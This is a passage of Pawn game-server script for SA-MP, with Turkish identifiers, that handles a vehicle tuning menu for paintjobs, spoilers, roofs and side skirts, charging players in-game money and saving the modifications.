					CreateVehicle(model2,aaX,aaY,aaZ,aaA,1,1, -1, 0);
					SetVehicleVirtualWorld(kArac[playerid], _vw);
					LinkVehicleToInterior(kArac[playerid], _int);
					SetVehicleZAngle(kArac[playerid], aaA);
					//ChangeVehicleColor(kArac[playerid], 1, 1);
					ModifiyeleriYukle(kArac[playerid]);
				 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
				 	kArac[playerid] = 0;
				 	return 1;
				}
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç paintjob için uygun deðil.");
					return 1;
                }
  			}
  			if(listitem == 1)
  			{
				if(GetVehicleModel(kArac[playerid]) == 534 || GetVehicleModel(kArac[playerid]) == 535 || GetVehicleModel(kArac[playerid]) == 536 || GetVehicleModel(kArac[playerid]) == 558 || GetVehicleModel(kArac[playerid]) == 559 || GetVehicleModel(kArac[playerid]) == 560
				|| GetVehicleModel(kArac[playerid]) == 561 || GetVehicleModel(kArac[playerid]) == 562 || GetVehicleModel(kArac[playerid]) == 565 || GetVehicleModel(kArac[playerid]) == 567 || GetVehicleModel(kArac[playerid]) == 575 || GetVehicleModel(kArac[playerid]) == 576)
				{
				    if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Yeterli paranýz yok.[1000$]");
				    GivePlayerCash(playerid, -1000);
					AracModifiyeleri[Arac[kArac[playerid]][aid]][ModPaintjob] = 2;
					//ChangeVehicleColor(kArac[playerid], 1, 1);
					new model2, _int, _vw, Float: _ax, Float: _ay, Float: _az, Float: aa;
					model2 = GetVehicleModel(kArac[playerid]);
					GetVehiclePos(kArac[playerid],_ax,_ay,_az);
					GetVehicleZAngle(kArac[playerid], aa);
					_int = GetVehicleInterior(kArac[playerid]);
					_vw = GetVehicleVirtualWorld(kArac[playerid]);
					DestroyVehicle(kArac[playerid]);
					CreateVehicle(model2,_ax,_ay,_az,aa,1,1, -1, 0);
					SetVehicleVirtualWorld(kArac[playerid], _vw);
					LinkVehicleToInterior(kArac[playerid], _int);
					SetVehicleZAngle(kArac[playerid], aa);
					//ChangeVehicleColor(kArac[playerid],1,1);
					ModifiyeleriYukle(kArac[playerid]);
				 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
				 	kArac[playerid] = 0;
				}
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç paintjob için uygun deðil.");
					return 1;
                }
                return 1;
  			}
  			if(listitem == 2)
  			{
				if(GetVehicleModel(kArac[playerid]) == 534 || GetVehicleModel(kArac[playerid]) == 535 || GetVehicleModel(kArac[playerid]) == 536 || GetVehicleModel(kArac[playerid]) == 558 || GetVehicleModel(kArac[playerid]) == 559 || GetVehicleModel(kArac[playerid]) == 560
				|| GetVehicleModel(kArac[playerid]) == 561 || GetVehicleModel(kArac[playerid]) == 562 || GetVehicleModel(kArac[playerid]) == 565 || GetVehicleModel(kArac[playerid]) == 567 || GetVehicleModel(kArac[playerid]) == 576)
				{
				    if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Yeterli paranýz yok.[1000$]");
				    GivePlayerCash(playerid, -1000);
					AracModifiyeleri[Arac[kArac[playerid]][aid]][ModPaintjob] = 3;
					//ChangeVehicleColor(kArac[playerid], 1, 1);
					new model2, _int, _vw, Float: _ax, Float: _ay, Float: _az, Float: aa;
					model2 = GetVehicleModel(kArac[playerid]);
					GetVehiclePos(kArac[playerid],_ax,_ay,_az);
					GetVehicleZAngle(kArac[playerid], aa);
					_int = GetVehicleInterior(kArac[playerid]);
					_vw = GetVehicleVirtualWorld(kArac[playerid]);
					DestroyVehicle(kArac[playerid]);
					CreateVehicle(model2,_ax,_ay,_az,aa,1,1, -1, 0);
					SetVehicleVirtualWorld(kArac[playerid], _vw);
					LinkVehicleToInterior(kArac[playerid], _int);
					SetVehicleZAngle(kArac[playerid], aa);
					//ChangeVehicleColor(kArac[playerid],1,1);
					ModifiyeleriYukle(kArac[playerid]);
				 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
				 	kArac[playerid] = 0;
				 	//GivePlayerCash(playerid, -1000);
				}
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç paintjob için uygun deðil.");
					return 1;
                }
  			}
  			if(listitem == 3)
  			{
  			    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModPaintjob] = 0;
				new model2, _int, _vw, Float: _ax, Float: _ay, Float: _az, Float: aa;
				model2 = GetVehicleModel(kArac[playerid]);
				GetVehiclePos(kArac[playerid],_ax,_ay,_az);
				GetVehicleZAngle(kArac[playerid], aa);
				_int = GetVehicleInterior(kArac[playerid]);
				_vw = GetVehicleVirtualWorld(kArac[playerid]);
				DestroyVehicle(kArac[playerid]);
				CreateVehicle(model2,_ax,_ay,_az,aa,Arac[kArac[playerid]][arenk1],Arac[kArac[playerid]][arenk2], -1, 0);
				SetVehicleVirtualWorld(kArac[playerid], _vw);
				LinkVehicleToInterior(kArac[playerid], _int);
				SetVehicleZAngle(kArac[playerid], aa);
				//ChangeVehicleColor(kArac[playerid],1,1);
				ModifiyeleriYukle(kArac[playerid]);
				BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
				kArac[playerid] = 0;
				//GivePlayerCash(playerid, -1000);
  			}
		}
		return 1;
	}
	if(dialogid == 206+2)
	{
		if(response)
		{
			if(listitem == 0)
			{
			    if(GetVehicleModel(kArac[playerid]) == 565 || GetVehicleModel(kArac[playerid]) == 561 || GetVehicleModel(kArac[playerid]) == 560 || GetVehicleModel(kArac[playerid]) == 562 || GetVehicleModel(kArac[playerid]) == 559 || GetVehicleModel(kArac[playerid]) == 558)
			    {
                    if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Yeterli paranýz yok.[1000$]");
				    GivePlayerCash(playerid, -1000);
	            	if(GetVehicleModel(kArac[playerid]) == 565)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModSpoiler] = 1049;
						AddVehicleComponent(kArac[playerid], 1049);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					}
	            	if(GetVehicleModel(kArac[playerid]) == 561)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModSpoiler] = 1058;
						AddVehicleComponent(kArac[playerid], 1058);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					}
					if(GetVehicleModel(kArac[playerid]) == 560)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModSpoiler] = 1138;
						AddVehicleComponent(kArac[playerid], 1138);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					}
	            	if(GetVehicleModel(kArac[playerid]) == 562)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModSpoiler] = 1147;
						AddVehicleComponent(kArac[playerid], 1147);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					}
	            	if(GetVehicleModel(kArac[playerid]) == 559)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModSpoiler] = 1162;
						AddVehicleComponent(kArac[playerid], 1162);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					}
	            	if(GetVehicleModel(kArac[playerid]) == 558)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModSpoiler] = 1164;
						AddVehicleComponent(kArac[playerid], 1164);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					}
                }
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
            }
			if(listitem == 1)
			{
			    if(GetVehicleModel(kArac[playerid]) == 565 || GetVehicleModel(kArac[playerid]) == 561 || GetVehicleModel(kArac[playerid]) == 560 || GetVehicleModel(kArac[playerid]) == 562 || GetVehicleModel(kArac[playerid]) == 559 || GetVehicleModel(kArac[playerid]) == 558)
			    {
			        if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Yeterli paranýz yok.[1000$]");
				    GivePlayerCash(playerid, -1000);
	            	if(GetVehicleModel(kArac[playerid]) == 565)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModSpoiler] = 1050;
						AddVehicleComponent(kArac[playerid], 1050);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					}
	            	if(GetVehicleModel(kArac[playerid]) == 561)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModSpoiler] = 1060;
						AddVehicleComponent(kArac[playerid], 1060);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					}
					if(GetVehicleModel(kArac[playerid]) == 560)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModSpoiler] = 1139;
						AddVehicleComponent(kArac[playerid], 1139);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					}
	            	if(GetVehicleModel(kArac[playerid]) == 562)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModSpoiler] = 1146;
						AddVehicleComponent(kArac[playerid], 1146);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					}
	            	if(GetVehicleModel(kArac[playerid]) == 559)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModSpoiler] = 1158;
						AddVehicleComponent(kArac[playerid], 1158);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					}
	            	if(GetVehicleModel(kArac[playerid]) == 558)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModSpoiler] = 1163;
						AddVehicleComponent(kArac[playerid], 1163);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					}
            	}
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
            }
		}
		kArac[playerid] = 0;
		return 1;
	}
	if(dialogid == 206+3)
	{
		if(response)
		{
			if(listitem == 0)
			{
			    if(GetVehicleModel(kArac[playerid]) == 565 || GetVehicleModel(kArac[playerid]) == 561 || GetVehicleModel(kArac[playerid]) == 560 || GetVehicleModel(kArac[playerid]) == 562 || GetVehicleModel(kArac[playerid]) == 559 || GetVehicleModel(kArac[playerid]) == 558)
			    {
			        if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Yeterli paranýz yok.[1000$]");
				    GivePlayerCash(playerid, -1000);
            		if(GetVehicleModel(kArac[playerid]) == 565)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRoof] = 1054;
						AddVehicleComponent(kArac[playerid], 1054);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
						kArac[playerid] = 0;
					}
            		if(GetVehicleModel(kArac[playerid]) == 561)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRoof] = 1055;
						AddVehicleComponent(kArac[playerid], 1055);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
						kArac[playerid] = 0;
					}
					if(GetVehicleModel(kArac[playerid]) == 560)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRoof] = 1032;
						AddVehicleComponent(kArac[playerid], 1032);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
						kArac[playerid] = 0;
					}
            		if(GetVehicleModel(kArac[playerid]) == 562)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRoof] = 1038;
						AddVehicleComponent(kArac[playerid], 1038);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
						kArac[playerid] = 0;
					}
            		if(GetVehicleModel(kArac[playerid]) == 559)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRoof] = 1067;
						AddVehicleComponent(kArac[playerid], 1067);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
						kArac[playerid] = 0;
					}
            		if(GetVehicleModel(kArac[playerid]) == 558)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRoof] = 1088;
						AddVehicleComponent(kArac[playerid], 1088);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
						kArac[playerid] = 0;
					}
            	}
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
            }
			if(listitem == 1)
			{
			    if(GetVehicleModel(kArac[playerid]) == 565 || GetVehicleModel(kArac[playerid]) == 561 || GetVehicleModel(kArac[playerid]) == 560 || GetVehicleModel(kArac[playerid]) == 562 || GetVehicleModel(kArac[playerid]) == 559 || GetVehicleModel(kArac[playerid]) == 558)
			    {
			        if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Yeterli paranýz yok.[1000$]");
				    GivePlayerCash(playerid, -1000);
	            	if(GetVehicleModel(kArac[playerid]) == 565)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRoof] = 1053;
						AddVehicleComponent(kArac[playerid], 1053);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
						kArac[playerid] = 0;
					}
	            	if(GetVehicleModel(kArac[playerid]) == 561)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRoof] = 1061;
						AddVehicleComponent(kArac[playerid], 1061);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
						kArac[playerid] = 0;
					}
					if(GetVehicleModel(kArac[playerid]) == 560)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRoof] = 1033;
						AddVehicleComponent(kArac[playerid], 1033);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
						kArac[playerid] = 0;
					}
	            	if(GetVehicleModel(kArac[playerid]) == 562)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRoof] = 1035;
						AddVehicleComponent(kArac[playerid], 1035);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
						kArac[playerid] = 0;
					}
	            	if(GetVehicleModel(kArac[playerid]) == 559)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRoof] = 1068;
						AddVehicleComponent(kArac[playerid], 1068);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
						kArac[playerid] = 0;
					}
	            	if(GetVehicleModel(kArac[playerid]) == 558)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRoof] = 1091;
						AddVehicleComponent(kArac[playerid], 1091);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
						kArac[playerid] = 0;
					}
            	}
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
            }
			if(listitem == 2)
			{
			    if(GetVehicleModel(kArac[playerid]) == 536)
			    {
					if(GetVehicleModel(kArac[playerid]) == 536)
					{
					    if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Yeterli paranýz yok.[1000$]");
				    	GivePlayerCash(playerid, -1000);
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRoof] = 1103;
						AddVehicleComponent(kArac[playerid], 1103);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
						kArac[playerid] = 0;
					}
            	}
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
			}
			if(listitem == 3)
			{
			    if(GetVehicleModel(kArac[playerid]) == 536)
			    {
			        if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Yeterli paranýz yok.[1000$]");
				    GivePlayerCash(playerid, -1000);
					if(GetVehicleModel(kArac[playerid]) == 536)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRoof] = 1128;
						AddVehicleComponent(kArac[playerid], 1128);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
						kArac[playerid] = 0;
					}
            	}
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
			}
			if(listitem == 4)
			{
			    if(GetVehicleModel(kArac[playerid]) == 567)
			    {
			        if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Yeterli paranýz yok.[1000$]");
				    GivePlayerCash(playerid, -1000);
					if(GetVehicleModel(kArac[playerid]) == 567)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRoof] = 1130;
						AddVehicleComponent(kArac[playerid], 1130);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
						kArac[playerid] = 0;
					}
            	}
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
			}
			if(listitem == 5)
			{
			    if(GetVehicleModel(kArac[playerid]) == 567)
			    {
			        if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Yeterli paranýz yok.[1000$]");
				    GivePlayerCash(playerid, -1000);
					if(GetVehicleModel(kArac[playerid]) == 567)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRoof] = 1131;
						AddVehicleComponent(kArac[playerid], 1131);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
						kArac[playerid] = 0;
					}
            	}
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
			}
		}
		return 1;
	}
	if(dialogid == 206+4)
	{
		if(response)
		{
			if(listitem == 0)
			{
			    if(GetVehicleModel(kArac[playerid]) == 565 || GetVehicleModel(kArac[playerid]) == 561 || GetVehicleModel(kArac[playerid]) == 560 || GetVehicleModel(kArac[playerid]) == 562 || GetVehicleModel(kArac[playerid]) == 559 || GetVehicleModel(kArac[playerid]) == 558)
			    {
			        if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Yeterli paranýz yok.[1000$]");
				    GivePlayerCash(playerid, -1000);
	            	if(GetVehicleModel(kArac[playerid]) == 565)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1051;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1047;
						AddVehicleComponent(kArac[playerid], 1051);
						AddVehicleComponent(kArac[playerid], 1047);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
            		if(GetVehicleModel(kArac[playerid]) == 561)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1062;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1056;
						AddVehicleComponent(kArac[playerid], 1062);
						AddVehicleComponent(kArac[playerid], 1056);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
					if(GetVehicleModel(kArac[playerid]) == 560)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1027;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1026;
						AddVehicleComponent(kArac[playerid], 1027);
						AddVehicleComponent(kArac[playerid], 1026);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
            		if(GetVehicleModel(kArac[playerid]) == 562)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1040;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1036;
						AddVehicleComponent(kArac[playerid], 1040);
						AddVehicleComponent(kArac[playerid], 1036);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
            		if(GetVehicleModel(kArac[playerid]) == 559)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1071;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1069;
						AddVehicleComponent(kArac[playerid], 1071);
						AddVehicleComponent(kArac[playerid], 1069);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
            		if(GetVehicleModel(kArac[playerid]) == 558)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1094;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1090;
						AddVehicleComponent(kArac[playerid], 1094);
						AddVehicleComponent(kArac[playerid], 1090);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
            	}
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
            }
			if(listitem == 1)
			{
			    if(GetVehicleModel(kArac[playerid]) == 565 || GetVehicleModel(kArac[playerid]) == 561 || GetVehicleModel(kArac[playerid]) == 560 || GetVehicleModel(kArac[playerid]) == 562 || GetVehicleModel(kArac[playerid]) == 559 || GetVehicleModel(kArac[playerid]) == 558)
			    {
			        if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Yeterli paranýz yok.[1000$]");
				    GivePlayerCash(playerid, -1000);
            		if(GetVehicleModel(kArac[playerid]) == 565)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1048;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1052;
						AddVehicleComponent(kArac[playerid], 1048);
						AddVehicleComponent(kArac[playerid], 1052);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
            		if(GetVehicleModel(kArac[playerid]) == 561)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1063;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1057;
						AddVehicleComponent(kArac[playerid], 1063);
						AddVehicleComponent(kArac[playerid], 1057);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
					if(GetVehicleModel(kArac[playerid]) == 560)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1030;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1031;
						AddVehicleComponent(kArac[playerid], 1030);
						AddVehicleComponent(kArac[playerid], 1031);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
            		if(GetVehicleModel(kArac[playerid]) == 562)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1039;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1041;
						AddVehicleComponent(kArac[playerid], 1039);
						AddVehicleComponent(kArac[playerid], 1041);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
            		if(GetVehicleModel(kArac[playerid]) == 559)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1072;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1070;
						AddVehicleComponent(kArac[playerid], 1072);
						AddVehicleComponent(kArac[playerid], 1070);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
            		if(GetVehicleModel(kArac[playerid]) == 558)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1093;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1095;
						AddVehicleComponent(kArac[playerid], 1093);
						AddVehicleComponent(kArac[playerid], 1095);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
            	}
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
            }
			if(listitem == 2)
			{
			    if(GetVehicleModel(kArac[playerid]) == 575)
			    {
			        if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Yeterli paranýz yok.[1000$]");
				    GivePlayerCash(playerid, -1000);
					if(GetVehicleModel(kArac[playerid]) == 575)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1099;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1042;
						AddVehicleComponent(kArac[playerid], 1099);
						AddVehicleComponent(kArac[playerid], 1042);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
            	}
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
			}
			if(listitem == 3)
			{
			    if(GetVehicleModel(kArac[playerid]) == 534)
			    {
			        if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Yeterli paranýz yok.[1000$]");
				    GivePlayerCash(playerid, -1000);
					if(GetVehicleModel(kArac[playerid]) == 534)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1101;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1122;
						AddVehicleComponent(kArac[playerid], 1101);
						AddVehicleComponent(kArac[playerid], 1122);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
            	}
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
			}
			if(listitem == 4)
			{
			    if(GetVehicleModel(kArac[playerid]) == 534)
			    {
			        if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Yeterli paranýz yok.[1000$]");
				    GivePlayerCash(playerid, -1000);
					if(GetVehicleModel(kArac[playerid]) == 534)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1124;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1106;
						AddVehicleComponent(kArac[playerid], 1124);
						AddVehicleComponent(kArac[playerid], 1106);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
            	}
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
			}
			if(listitem == 5)
			{
			    if(GetVehicleModel(kArac[playerid]) == 567 || GetVehicleModel(kArac[playerid]) == 536 || GetVehicleModel(kArac[playerid]) == 576)
			    {
			    	if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Yeterli paranýz yok.[1000$]");
				    GivePlayerCash(playerid, -1000);
					if(GetVehicleModel(kArac[playerid]) == 567)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1102;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1133;
						AddVehicleComponent(kArac[playerid], 1102);
						AddVehicleComponent(kArac[playerid], 1133);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
					if(GetVehicleModel(kArac[playerid]) == 536)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1107;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1108;
						AddVehicleComponent(kArac[playerid], 1107);
						AddVehicleComponent(kArac[playerid], 1108);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
					if(GetVehicleModel(kArac[playerid]) == 576)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1037;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1034;
						AddVehicleComponent(kArac[playerid], 1037);
						AddVehicleComponent(kArac[playerid], 1034);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
            	}
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
			}
			if(listitem == 6)
			{
			    if(GetVehicleModel(kArac[playerid]) == 535)
			    {
			        if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Yeterli paranýz yok.[1000$]");
				    GivePlayerCash(playerid, -1000);
					if(GetVehicleModel(kArac[playerid]) == 535)
					{
      					AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1120;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1118;
						AddVehicleComponent(kArac[playerid], 1120);
						AddVehicleComponent(kArac[playerid], 1118);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
            	}
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
			}
			if(listitem == 7)
			{
